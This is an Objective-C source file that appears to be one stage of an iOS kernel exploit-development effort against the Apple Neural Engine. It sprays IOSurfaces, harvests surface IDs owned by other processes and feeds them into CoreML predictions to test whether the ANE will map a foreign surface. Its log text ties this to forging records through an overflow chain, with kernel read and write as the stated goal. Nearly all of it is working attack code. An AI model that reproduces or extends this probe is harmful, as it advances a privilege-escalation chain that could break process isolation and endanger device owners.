//
//  P081AneForeignProbe.m — bias isolation + foreign-sid fetch test. See header.
//

#import "P081AneForeignProbe.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <CoreML/CoreML.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <math.h>
#import <string.h>
#import <unistd.h>

#define P081_BUILD    @"p081-foreign-v1"
#define P081_MODEL_A  @"XVRC27_127in_1out"
#define P081_MODEL_B  @"XVRC27_127inmin_1out"
#define P081_N_IN     127u
#define P081_N_SURF   412u
#define P081_CAP_MARK 0x53535353u
#define P081_ZERO     0x00000000u
#define P081_REPS     20u
#define P081_ENGAGE_MS 1.0
#define P081_MAX_GAPS 8u

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*p081_iosCreate_t)(CFDictionaryRef);
typedef uint32_t (*p081_iosGetID_t)(IOSurfaceRef);
typedef void *(*p081_iosBase_t)(IOSurfaceRef);
typedef size_t (*p081_iosAllocSz_t)(IOSurfaceRef);
typedef kern_return_t (*p081_iosLock_t)(IOSurfaceRef, uint32_t, uint32_t *);

typedef struct {
    IOSurfaceRef surf;
    uint32_t     sid;
    size_t       allocSize;
} p081_surf_t;

static int g_p081_fd = -1;
static NSMutableString *g_p081_buf;

static void p081_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    @synchronized ([P081AneForeignProbe class]) {
        if (g_p081_buf) [g_p081_buf appendString:out];
        if (g_p081_fd >= 0) {
            const char *s = out.UTF8String;
            if (s) {
                write(g_p081_fd, s, strlen(s));
                fcntl(g_p081_fd, F_FULLFSYNC);
            }
        }
    }
}

#pragma mark - IOSurface helpers

static p081_iosCreate_t  s_iosCreate;
static p081_iosGetID_t   s_iosGetID;
static p081_iosBase_t    s_iosBase;
static p081_iosAllocSz_t s_iosAllocSz;
static p081_iosLock_t    s_iosLock;
static p081_iosLock_t    s_iosUnlock;

static BOOL p081_resolve_iosurface(void) {
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) return NO;
    s_iosCreate  = (p081_iosCreate_t)dlsym(h, "IOSurfaceCreate");
    s_iosGetID   = (p081_iosGetID_t)dlsym(h, "IOSurfaceGetID");
    s_iosBase    = (p081_iosBase_t)dlsym(h, "IOSurfaceGetBaseAddress");
    s_iosAllocSz = (p081_iosAllocSz_t)dlsym(h, "IOSurfaceGetAllocSize");
    s_iosLock    = (p081_iosLock_t)dlsym(h, "IOSurfaceLock");
    s_iosUnlock  = (p081_iosLock_t)dlsym(h, "IOSurfaceUnlock");
    return s_iosCreate && s_iosGetID && s_iosBase && s_iosAllocSz && s_iosLock && s_iosUnlock;
}

static CFNumberRef p081_cfnum(uint64_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

static IOSurfaceRef p081_surface_create(void) {
    CFNumberRef w = p081_cfnum(1), h = p081_cfnum(1);
    CFNumberRef bpe = p081_cfnum(4), fmt = p081_cfnum(0x42475241);
    const void *keys[] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                           CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *vals[] = { w, h, bpe, fmt };
    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 4,
                                               &kCFTypeDictionaryKeyCallBacks,
                                               &kCFTypeDictionaryValueCallBacks);
    CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(fmt);
    if (!props) return NULL;
    IOSurfaceRef s = s_iosCreate(props);
    CFRelease(props);
    return s;
}

static void p081_surface_fill_u32(IOSurfaceRef s, uint32_t pattern) {
    void *base = s_iosBase(s);
    size_t sz = s_iosAllocSz(s);
    if (!base || sz == 0 || sz > (16UL << 20)) return;
    if (s_iosLock(s, 0, NULL) != KERN_SUCCESS) return;
    uint32_t *p = (uint32_t *)base;
    for (size_t k = 0; k + 4 <= sz; k += 4) p[k / 4] = pattern;
    s_iosUnlock(s, 0, NULL);
}

static BOOL p081_surface_scan_pattern(p081_surf_t *e, const char *label, uint32_t pattern) {
    if (!e->surf) return NO;
    void *base = s_iosBase(e->surf);
    if (!base) return NO;
    size_t sz = e->allocSize;
    if (sz == 0 || sz > (16UL << 20)) return NO;
    if (s_iosLock(e->surf, 0, NULL) != KERN_SUCCESS) return NO;
    const uint8_t *b = (const uint8_t *)base;
    const uint8_t exp[4] = { (uint8_t)(pattern & 0xff), (uint8_t)((pattern >> 8) & 0xff),
                             (uint8_t)((pattern >> 16) & 0xff), (uint8_t)((pattern >> 24) & 0xff) };
    size_t diffOff = sz;
    uint32_t diffCnt = 0;
    for (size_t k = 0; k < sz; k++) {
        if (b[k] != exp[k & 3]) { if (diffOff == sz) diffOff = k; diffCnt++; if (diffCnt >= 256) break; }
    }
    s_iosUnlock(e->surf, 0, NULL);
    if (diffOff != sz) {
        p081_log(@"  [!] %s TOUCHED sid=%u first diff at +0x%zx (>= %u bytes)",
                 label, e->sid, diffOff, diffCnt);
        return YES;
    }
    return NO;
}

static uint32_t p081_scan_all(p081_surf_t *surfs, uint32_t made, p081_surf_t *cap,
                              const char *label) {
    uint32_t hits = 0;
    for (uint32_t i = 0; i < made; i++) {
        p081_surf_t *e = &surfs[i];
        if (e == cap) continue;
        if (p081_surface_scan_pattern(e, [[NSString stringWithFormat:@"%s[%u]", label, i]
                                          UTF8String], P081_ZERO)) hits++;
        if (hits >= 8) { p081_log(@"  [!] scan aborted early (8 hits)"); break; }
    }
    if (p081_surface_scan_pattern(cap, [[NSString stringWithFormat:@"%s[cap]", label]
                                        UTF8String], P081_CAP_MARK)) hits++;
    return hits;
}

static double p081_fp16_serial_sum(const double *v, uint32_t n) {
    __fp16 acc = (__fp16)0.0f;
    for (uint32_t i = 0; i < n; i++)
        acc = (__fp16)((float)acc + (float)v[i]);
    return (double)(float)acc;
}

#pragma mark - CoreML

static NSURL *p081_model_url(NSString *name) {
    NSBundle *b = [NSBundle mainBundle];
    NSURL *u = [b URLForResource:name withExtension:@"mlmodelc"];
    if (u) return u;
    return [b URLForResource:name withExtension:@"mlpackage"];
}

static MLModel *p081_load(NSURL *url, MLComputeUnits units, NSError **errOut) {
    MLModelConfiguration *cfg = [[MLModelConfiguration alloc] init];
    cfg.computeUnits = units;
    return [MLModel modelWithContentsOfURL:url configuration:cfg error:errOut];
}

static MLDictionaryFeatureProvider *p081_provider_values(const double *vals, uint32_t nIn,
                                                         NSError **errOut) {
    NSMutableDictionary *features = [NSMutableDictionary dictionary];
    for (uint32_t i = 0; i < nIn; i++) {
        MLMultiArray *m = [[MLMultiArray alloc] initWithShape:@[ @1 ]
                                                   dataType:MLMultiArrayDataTypeDouble
                                                      error:nil];
        if (!m) return nil;
        m[0] = @(vals[i]);
        features[[NSString stringWithFormat:@"x_%03u", i]] =
            [MLFeatureValue featureValueWithMultiArray:m];
    }
    return [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:errOut];
}

static double p081_predict(MLModel *model, MLDictionaryFeatureProvider *fp,
                           NSTimeInterval *dur, NSError **errOut) {
    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
    id<MLFeatureProvider> pred = [model predictionFromFeatures:fp error:errOut];
    CFAbsoluteTime t1 = CFAbsoluteTimeGetCurrent();
    *dur = t1 - t0;
    if (!pred) return NAN;
    MLFeatureValue *yv = [pred featureValueForName:@"y"];
    MLMultiArray *ya = yv.multiArrayValue;
    return ya ? ya[0].doubleValue : NAN;
}

static NSString *p081_yfmt(double y) {
    return (y == y) ? [NSString stringWithFormat:@"%.6e", y] : @"NaN";
}

static void p081_finish(uint32_t made, p081_surf_t *surfs) {
    for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
    free(surfs);
    if (g_p081_fd >= 0) { fcntl(g_p081_fd, F_FULLFSYNC); close(g_p081_fd); g_p081_fd = -1; }
}

static NSString *p081_return(void) {
    NSString *ret = g_p081_buf;
    g_p081_buf = nil;
    return ret;
}

@implementation P081AneForeignProbe

+ (NSString *)tap {
    g_p081_buf = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p081_ane_foreign_log.txt"];
    g_p081_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p081_log(@"=== p081 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P081_BUILD);
    p081_log(@"P080 follow-up, three questions one tap:");
    p081_log(@"  E. bias isolation: all 127 x = sid0 (faithful => exact 127*sid0).");
    p081_log(@"  F. FOREIGN-SID fetch: x_126 = gap id taken by another process");
    p081_log(@"     between our creates. No-abort => global fetch => Stage B alive.");
    p081_log(@"  S. staging gaps after load/predicts = espresso staging candidates.");
    p081_log(@"PANIC POSSIBLE in F (kernel fetch of a foreign-owned surface).");
    p081_log(@"%@", [P007Board shared].kreadSignal);

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p081"];
    if (stop) {
        p081_log(@"%@", stop);
        p081_finish(0, NULL);
        return p081_return();
    }
    p081_log(@"%@", [LabDeviceProfile identBlock]);

    if (!p081_resolve_iosurface()) {
        p081_log(@"[-] IOSurface dlsym FAILED — abort");
        p081_log(@"=== VERDICT === abort (iosurface). hasKread=NO hasKwrite=NO.");
        p081_finish(0, NULL);
        return p081_return();
    }

    /* ---- surfaces + FRESH GAP capture ---- */
    p081_surf_t *surfs = calloc(P081_N_SURF, sizeof(p081_surf_t));
    uint32_t made = 0;
    uint32_t gaps[P081_MAX_GAPS];
    uint32_t nGaps = 0;
    uint32_t totalGapIds = 0;
    uint32_t prevSid = 0;
    for (uint32_t i = 0; i < P081_N_SURF; i++) {
        IOSurfaceRef s = p081_surface_create();
        if (!s) continue;
        uint32_t sid = s_iosGetID(s);
        if (prevSid && sid > prevSid + 1) {
            uint32_t g = prevSid + 1;
            while (g < sid) {
                totalGapIds++;
                /* rolling window: keep the FRESHEST P081_MAX_GAPS */
                if (nGaps < P081_MAX_GAPS) { gaps[nGaps++] = g; }
                else { memmove(gaps, gaps + 1, (P081_MAX_GAPS - 1) * sizeof(uint32_t));
                       gaps[P081_MAX_GAPS - 1] = g; }
                g++;
            }
        }
        prevSid = sid;
        surfs[made].surf = s;
        surfs[made].sid = sid;
        surfs[made].allocSize = s_iosAllocSz(s);
        made++;
    }
    p081_log(@"[+] surfaces: %u/%u (ids %u..%u)", made, P081_N_SURF, surfs[0].sid, prevSid);
    p081_log(@"[+] gap ids consumed by OTHER processes between our creates: %u total",
             totalGapIds);
    p081_log(@"[+] freshest gap ids (probe targets): %u %u %u %u %u %u %u %u",
             nGaps > 0 ? gaps[0] : 0, nGaps > 1 ? gaps[1] : 0, nGaps > 2 ? gaps[2] : 0,
             nGaps > 3 ? gaps[3] : 0, nGaps > 4 ? gaps[4] : 0, nGaps > 5 ? gaps[5] : 0,
             nGaps > 6 ? gaps[6] : 0, nGaps > 7 ? gaps[7] : 0);
    if (made < P081_N_IN + 2) {
        p081_log(@"[-] need >= %u surfaces — abort", P081_N_IN + 2);
        p081_log(@"=== VERDICT === abort (surfaces). hasKread=NO hasKwrite=NO.");
        p081_finish(made, surfs);
        return p081_return();
    }
    p081_surf_t *cap = &surfs[made - 1];
    uint32_t nCand = made - 1;

    /* full sid list for offline reduction-order sims */
    NSMutableString *sidList = [NSMutableString string];
    for (uint32_t i = 0; i < nCand; i++) {
        [sidList appendFormat:@"%u,", surfs[i].sid];
        if ((i % 16) == 15 || i == nCand - 1) {
            p081_log(@"SIDS[%03u..%@] %@", i - (i % 16),
                     [NSString stringWithFormat:@"%03u", i], sidList);
            [sidList setString:@""];
        }
    }

    uint32_t maxSid = 0;
    for (uint32_t i = 0; i < made; i++) {
        p081_surface_fill_u32(surfs[i].surf, (&surfs[i] == cap) ? P081_CAP_MARK : P081_ZERO);
        if (i < nCand && surfs[i].sid > maxSid) maxSid = surfs[i].sid;
    }
    p081_log(@"[+] capture sid_C=%u staged MARK; %u candidates staged ZERO (fp16-exact %s)",
             cap->sid, nCand, maxSid <= 2048 ? @"YES" : @"NO");
    p081_log(@"[+] sid0=%u (bias-test value; write target = candidate 0)", surfs[0].sid);

    /* ---- load models ---- */
    NSError *err = nil;
    MLModel *modelA = p081_load(p081_model_url(P081_MODEL_A), MLComputeUnitsAll, &err);
    if (!modelA) {
        p081_log(@"[-] load A FAILED: %@", err.localizedDescription ?: @"-");
        p081_log(@"=== VERDICT === abort (load A). hasKread=NO hasKwrite=NO.");
        p081_finish(made, surfs);
        return p081_return();
    }
    MLModel *modelACpu = p081_load(p081_model_url(P081_MODEL_A), MLComputeUnitsCPUOnly, &err);
    MLModel *modelB = p081_load(p081_model_url(P081_MODEL_B), MLComputeUnitsAll, &err);
    p081_log(@"[+] A loaded (All); cpuOnly twin %@; B %@",
             modelACpu ? @"loaded" : @"FAILED", modelB ? @"loaded" : @"FAILED");

    /* ---- PHASE G: engagement gate (P080 proven config: x = live sids) ---- */
    double sids[P081_N_IN];
    for (uint32_t i = 0; i < P081_N_IN; i++) sids[i] = (double)surfs[i].sid;
    MLDictionaryFeatureProvider *fpG = p081_provider_values(sids, P081_N_IN, &err);
    if (!fpG) {
        p081_log(@"[-] provider G FAILED: %@", err.localizedDescription ?: @"-");
        p081_log(@"=== VERDICT === abort (provider). hasKread=NO hasKwrite=NO.");
        p081_finish(made, surfs);
        return p081_return();
    }
    p081_log(@"--- PHASE G: engagement gate (live sids, 128 records/predict) ---");
    double yW = NAN;
    NSTimeInterval d = 0;
    NSTimeInterval minAll = 1e9, minCpu = 1e9;
    for (uint32_t r = 0; r < P081_REPS; r++) {
        err = nil;
        yW = p081_predict(modelA, fpG, &d, &err);
        if (r == 0 && err) p081_log(@"[!] W0 err: %@", err.localizedDescription ?: @"-");
        if (d < minAll) minAll = d;
    }
    if (modelACpu) {
        for (uint32_t r = 0; r < P081_REPS; r++) {
            NSTimeInterval dc = 0;
            err = nil;
            p081_predict(modelACpu, fpG, &dc, &err);
            if (dc < minCpu) minCpu = dc;
        }
    }
    BOOL engaged = modelACpu && (minAll > minCpu + P081_ENGAGE_MS / 1000.0);
    double dblSumG = 0;
    for (uint32_t i = 0; i < P081_N_IN; i++) dblSumG += sids[i];
    p081_log(@"[*] GATE y=%@ exact=%.6e minAll=%.2fms minCpu=%.2fms -> ANE %s",
             p081_yfmt(yW), dblSumG, minAll * 1000.0, minCpu * 1000.0,
             engaged ? "ENGAGED" : "NOT ENGAGED");
    (void)p081_scan_all(surfs, made, cap, "G");

    if (!engaged) {
        p081_log(@"=== VERDICT ===");
        p081_log(@"ANE NOT ENGAGED this boot — rerun after fresh boot (P080 was 3/3).");
        p081_log(@"hasKread=NO hasKwrite=NO.");
        p081_finish(made, surfs);
        return p081_return();
    }

    /* ---- PHASE E: all-x-equal bias isolation ---- */
    p081_log(@"--- PHASE E: all 127 x = sid0 = %u (bias isolation) ---", surfs[0].sid);
    double eVals[P081_N_IN];
    for (uint32_t i = 0; i < P081_N_IN; i++) eVals[i] = (double)surfs[0].sid;
    MLDictionaryFeatureProvider *fpE = p081_provider_values(eVals, P081_N_IN, &err);
    if (fpE) {
        err = nil;
        double yE = p081_predict(modelA, fpE, &d, &err);
        double exactE = 127.0 * (double)surfs[0].sid;
        double simE = p081_fp16_serial_sum(eVals, P081_N_IN);
        double delta = (yE == yE) ? (yE - exactE) : NAN;
        p081_log(@"[*] E y=%@ exact=%.6e fp16sim=%.6e t=%.2fms err=%@",
                 p081_yfmt(yE), exactE, simE, d * 1000.0, err.localizedDescription ?: @"none");
        p081_log(@"[*] E DELTA (y - exact) = %@ -> %@",
                 p081_yfmt(delta),
                 delta == 0.0 ? @"FAITHFUL: bias was pure reduction-order rounding" :
                 (delta == (double)surfs[0].sid ? @"ONE input double-counted" :
                  @"see k*sid0 for k double-counted inputs, or other staging detail"));
        (void)p081_scan_all(surfs, made, cap, "E");
    } else {
        p081_log(@"[-] provider E FAILED — bias test skipped");
    }

    /* ---- PHASE F: foreign-sid fetch probe ---- */
    p081_log(@"--- PHASE F: foreign-sid fetch probe ---");
    double fVals[P081_N_IN];
    for (uint32_t i = 0; i < P081_N_IN - 1; i++) fVals[i] = (double)surfs[i].sid;

    /* F-control: x_126 = live armed sid (must pass) */
    fVals[P081_N_IN - 1] = (double)surfs[1].sid;
    MLDictionaryFeatureProvider *fpC = p081_provider_values(fVals, P081_N_IN, &err);
    if (fpC) {
        err = nil;
        double yC = p081_predict(modelA, fpC, &d, &err);
        p081_log(@"[*] F-control x126=sid1=%u y=%@ t=%.2fms err=%@ (expect none)",
                 surfs[1].sid, p081_yfmt(yC), d * 1000.0, err.localizedDescription ?: @"none");
    }

    /* F-foreign: freshest gaps first */
    BOOL foreignOK = NO;
    uint32_t foreignSid = 0;
    for (uint32_t k = 0; k < nGaps && k < 4; k++) {
        uint32_t gs = gaps[nGaps - 1 - k];   /* freshest first */
        fVals[P081_N_IN - 1] = (double)gs;
        MLDictionaryFeatureProvider *fpF = p081_provider_values(fVals, P081_N_IN, &err);
        if (!fpF) continue;
        err = nil;
        double yF = p081_predict(modelA, fpF, &d, &err);
        p081_log(@"[*] F-foreign gap=%u y=%@ t=%.2fms err=%@",
                 gs, p081_yfmt(yF), d * 1000.0, err.localizedDescription ?: @"none");
        if (!err) { foreignOK = YES; foreignSid = gs; break; }
        (void)p081_scan_all(surfs, made, cap, "F");
    }
    p081_log(@"[*] F RESULT: foreign fetch %s (sid %u)",
             foreignOK ? "ACCEPTED" : "REJECTED-or-never-live", foreignOK ? foreignSid : 0);

    /* ---- PHASE B: model B control (y = x_000 exact) ---- */
    double yB = NAN;
    if (modelB) {
        MLDictionaryFeatureProvider *fpB2 = p081_provider_values(sids, P081_N_IN, &err);
        if (fpB2) {
            err = nil;
            yB = p081_predict(modelB, fpB2, &d, &err);
            p081_log(@"[*] B-control y=%@ (expect %.6e) t=%.2fms err=%@",
                     p081_yfmt(yB), sids[0], d * 1000.0, err.localizedDescription ?: @"none");
        }
        (void)p081_scan_all(surfs, made, cap, "B");
    }

    /* ---- PHASE S: staging gap detection after load + predicts ---- */
    p081_log(@"--- PHASE S: staging gaps after load/predicts ---");
    {
        uint32_t sPrev = prevSid, sGaps = 0;
        uint32_t sFirst[8]; uint32_t nS = 0;
        for (uint32_t i = 0; i < 64; i++) {
            IOSurfaceRef s = p081_surface_create();
            if (!s) continue;
            uint32_t sid = s_iosGetID(s);
            if (sPrev && sid > sPrev + 1) {
                for (uint32_t g = sPrev + 1; g < sid; g++) {
                    sGaps++;
                    if (nS < 8) sFirst[nS++] = g;
                }
            }
            sPrev = sid;
            CFRelease(s);
        }
        p081_log(@"[+] post-predict gap ids: %u total; first: %u %u %u %u %u %u %u %u",
                 sGaps, nS > 0 ? sFirst[0] : 0, nS > 1 ? sFirst[1] : 0,
                 nS > 2 ? sFirst[2] : 0, nS > 3 ? sFirst[3] : 0,
                 nS > 4 ? sFirst[4] : 0, nS > 5 ? sFirst[5] : 0,
                 nS > 6 ? sFirst[6] : 0, nS > 7 ? sFirst[7] : 0);
        p081_log(@"    (ids consumed while models were loaded/predicting = espresso");
        p081_log(@"     staging surface candidates for IOSurfaceLookup next probe)");
    }

    /* ---- verdict ---- */
    p081_log(@"=== VERDICT ===");
    if (foreignOK) {
        p081_log(@"FOREIGN FETCH ACCEPTED: the ANE record fetch consumed a surface id");
        p081_log(@"owned by ANOTHER process (gap id %u). Registry scope is GLOBAL.", foreignSid);
        p081_log(@"Stage B premise ALIVE: forge a record sid (43748 record overflow into");
        p081_log(@"our own second live request, notes 102 Chain 1) => cross-process");
        p081_log(@"surface mapped into the ANE path. Next: content/ownership questions");
        p081_log(@"(does the ANE READ or WRITE the fetched foreign surface bytes?) —");
        p081_log(@"note P080 said data comes from client values, so the mapping is the");
        p081_log(@"primitive, not the dataflow. Twin cross-process test next.");
        [[P007Board shared] recordEvent:@"p081_session" kind:@"foreign_fetch"
                                 detail:[NSString stringWithFormat:@"gap_sid=%u", foreignSid]
                                 source:@"p081"];
    } else {
        p081_log(@"FOREIGN FETCH REJECTED (or gap ids were dead): the error echoes above");
        p081_log(@"carry the rejected sids. If 'surface-Id: %u is nullptr' repeats for",
                 nGaps ? gaps[nGaps - 1] : 0);
        p081_log(@"every gap id, the fetch is per-task scoped OR the gaps were recycled");
        p081_log(@"transients. Stage B on THIS path needs the twin's definitive test");
        p081_log(@"(helper process surface, known live, known contents).");
        [[P007Board shared] recordEvent:@"p081_session" kind:@"foreign_reject"
                                 detail:@"gap sids rejected" source:@"p081"];
    }
    p081_log(@"Honesty: a foreign fetch is a MAPPING, not a write. Conversion bar");
    p081_log(@"(desc_type_forged OR (body_forged AND kptr)) untouched.");
    p081_log(@"hasKread=NO hasKwrite=NO. One TAP per force-quit; fresh boot next tap.");

    p081_finish(made, surfs);
    return p081_return();
}

@end